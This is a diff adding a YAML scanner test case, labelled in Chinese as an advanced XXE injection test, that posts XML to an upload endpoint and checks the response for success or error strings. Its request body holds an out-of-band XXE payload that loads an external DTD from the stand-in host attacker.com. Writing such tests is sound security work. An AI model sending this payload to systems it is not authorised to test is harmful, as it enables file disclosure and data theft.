@@ -1,0 +1,24 @@
+name: XML外部实体注入(XXE)高级测试
+description: 测试高级XML外部实体注入漏洞
+level: 高
+author: Test
+request:
+  method: POST
+  path: /xml-upload
+  params:
+    action: "upload"
+  headers:
+    Content-Type: "application/xml"
+    User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+    Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
+  body: "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [\n  <!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\">\n  %xxe;\n]>\n<root>\n  <name>test</name>\n</root>"
+response:
+  matchType: contains
+  successIndicators:
+    - "file uploaded"
+    - "上传成功"
+  errorIndicators:
+    - "invalid XML"
+    - "XML parsing error"
+    - "无效的XML"
+  statusCode: 200
